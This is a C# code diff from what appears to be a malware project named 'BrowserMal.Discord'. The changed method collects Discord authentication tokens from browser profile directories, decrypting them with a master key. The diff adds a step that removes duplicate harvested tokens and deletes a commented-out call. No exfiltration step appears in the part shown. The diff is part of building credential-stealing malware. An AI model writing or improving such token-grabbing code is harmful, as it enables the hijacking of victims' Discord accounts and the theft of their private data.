@@ -45,7 +45,15 @@ namespace BrowserMal.Discord
                 profiles.AddRange(GetProfiles(browser.Location, profileType, key));
             }
             
-            return profiles;
+            List<string> uniqueTokens = new List<string>();
+
+            foreach (string token in profiles)
+            {
+                if (!uniqueTokens.Contains(token))
+                    uniqueTokens.Add(token);
+            }
+
+            return uniqueTokens;
         }
 
         private List<string> GetProfiles(string path, string profileType, byte[] masterKey)
@@ -57,7 +65,6 @@ namespace BrowserMal.Discord
             {
                 if (Directory.Exists(directory))
                 {
-                    //GetTokenFiles(directory);
                     profilesToken.AddRange(GetTokenFiles(directory, masterKey));
                 }
             }
